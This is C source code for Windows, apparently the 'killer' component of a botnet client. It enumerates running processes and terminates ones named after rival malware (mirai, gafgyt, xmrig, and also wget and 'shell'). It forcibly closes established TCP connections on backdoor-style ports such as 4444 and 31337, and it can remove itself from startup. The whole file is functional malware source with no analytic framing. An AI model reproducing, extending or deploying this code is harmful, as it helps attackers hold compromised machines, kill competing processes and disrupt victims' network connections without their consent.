#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <stdint.h>
#include <string.h> 
#include <tlhelp32.h>
#include <stdbool.h>
#include <conio.h>
#include <iphlpapi.h>
#include "startup.h"
#include "killer.h"

#define MAX_KILL_PORTS 9  
static const int kill_port_list[MAX_KILL_PORTS] = {7000,9999,4444,5555,1337,12345,31337,4445,55555};

/* competing bot / malware process names to kill on Windows */
static const char *win_bot_names[] = {
    "mirai", "tsunami", "kaiten", "gafgyt", "bashlite", "qbot", "mirai.arm",
    "kworkerds", "watchdogs", "xmrig", "miner", "svchost2", "mirai_",
    "wget", "wget.exe", "shell", "kworker", "muhstik", "condi",
    NULL
};

/* scan running processes, kill known competing bots (except ourselves) */
void win_kill_bots(void) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    DWORD self_pid = GetCurrentProcessId();
    char self_path[MAX_PATH];
    GetModuleFileNameA(NULL, self_path, MAX_PATH);

    if (!Process32First(snap, &pe)) { CloseHandle(snap); return; }
    do {
        if (pe.th32ProcessID == self_pid) continue;
        char name_l[64];
        _snprintf(name_l, sizeof name_l, "%s", pe.szExeFile);
        for (int i = 0; name_l[i]; i++) {
            if (name_l[i] >= 'A' && name_l[i] <= 'Z') name_l[i] += 32;
        }
        for (int i = 0; win_bot_names[i]; i++) {
            if (strstr(name_l, win_bot_names[i])) {
                HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (h) { TerminateProcess(h, 1); CloseHandle(h); }
                break;
            }
        }
    } while (Process32Next(snap, &pe));
    CloseHandle(snap);
}

void killer() {
    delete_file_from_startup();
    ExitProcess(0);
}

void kill_tcp_ports_list() {
    printf("Kill port list contains: ");
    for (int i = 0; i < MAX_KILL_PORTS; i++) {
        printf("%d ", kill_port_list[i]);
    }
    printf("\n");
    
    kill_tcp_ports(kill_port_list, MAX_KILL_PORTS);
}

void kill_tcp_ports(const int *ports, int num_ports) {
    HMODULE hIphlpapi;
    DWORD dwSize = 0;
    PMIB_TCPTABLE pTcpTable = NULL;
    DWORD result;
    int killed_count = 0;
    
    printf("Attempting to kill TCP connections to target ports: ");
    for (int i = 0; i < num_ports && i < 5; i++) {
        // Add range check for port numbers
        if (ports[i] >= 0 && ports[i] <= 65535) {
            printf("%d ", ports[i]);
        } else {
            printf("INVALID_PORT(%d) ", ports[i]);
        }
    }
    if (num_ports > 5) printf("...");
    printf("\n");
    
    typedef DWORD (WINAPI *GetTcpTableFn)(PMIB_TCPTABLE, PDWORD, BOOL);
    typedef DWORD (WINAPI *SetTcpEntryFn)(PMIB_TCPROW);
    GetTcpTableFn pGetTcpTable;
    SetTcpEntryFn pSetTcpEntry;

    if (!ports || num_ports <= 0) {
        printf("Invalid port list or empty port list\n");
        return;
    }

    int valid_ports = 0;
    for (int i = 0; i < num_ports; i++) {
        if (ports[i] >= 0 && ports[i] <= 65535) {
            valid_ports++;
        }
    }
    
    if (valid_ports == 0) {
        printf("No valid ports found in the list\n");
        return;
    }

    if (!(hIphlpapi = LoadLibraryA("iphlpapi.dll"))) {
        printf("Failed to load iphlpapi.dll\n");
        return;
    }

    if (!(pGetTcpTable = (GetTcpTableFn)GetProcAddress(hIphlpapi, "GetTcpTable")) || 
        !(pSetTcpEntry = (SetTcpEntryFn)GetProcAddress(hIphlpapi, "SetTcpEntry"))) {
        printf("Failed to get function addresses\n");
        FreeLibrary(hIphlpapi);
        return;
    }

    if (pGetTcpTable(NULL, &dwSize, TRUE) != ERROR_INSUFFICIENT_BUFFER) {
        printf("Failed to get TCP table size\n");
        FreeLibrary(hIphlpapi);
        return;
    }

    if (!(pTcpTable = (PMIB_TCPTABLE)malloc(dwSize))) {
        printf("Memory allocation failed\n");
        FreeLibrary(hIphlpapi);
        return;
    }

    if ((result = pGetTcpTable(pTcpTable, &dwSize, TRUE)) != NO_ERROR) {
        printf("Failed to get TCP table, error: %ld\n", result);
        free(pTcpTable);
        FreeLibrary(hIphlpapi);
        return;
    }

    printf("Found %ld TCP connections\n", pTcpTable->dwNumEntries);

    for (DWORD i = 0; i < pTcpTable->dwNumEntries; i++) {
        PMIB_TCPROW pTcpRow = &pTcpTable->table[i];
        
        if (pTcpRow->dwState != MIB_TCP_STATE_ESTAB) {
            continue;
        }
        
        USHORT remote_port = ntohs((u_short)pTcpRow->dwRemotePort);
        
        struct in_addr addr;
        addr.s_addr = pTcpRow->dwRemoteAddr;
        char remote_ip[16];
        strcpy(remote_ip, inet_ntoa(addr));
        
        for (int j = 0; j < num_ports; j++) {
            if (ports[j] >= 0 && ports[j] <= 65535 && remote_port == (USHORT)ports[j]) {
                printf("Found connection to %s:%d - attempting to kill\n", remote_ip, remote_port);
                
                pTcpRow->dwState = MIB_TCP_STATE_DELETE_TCB;
                
                DWORD kill_result = pSetTcpEntry(pTcpRow);
                if (kill_result == NO_ERROR) {
                    printf("Successfully killed connection to %s:%d\n", remote_ip, remote_port);
                    killed_count++;
                } else {
                    printf("Failed to kill connection to %s:%d, error: %ld\n", remote_ip, remote_port, kill_result);
                }
                break;
            }
        }
    }

    printf("Killed %d TCP connections to target ports out of %ld total connections\n", 
           killed_count, pTcpTable->dwNumEntries);

    free(pTcpTable);
    FreeLibrary(hIphlpapi);
}
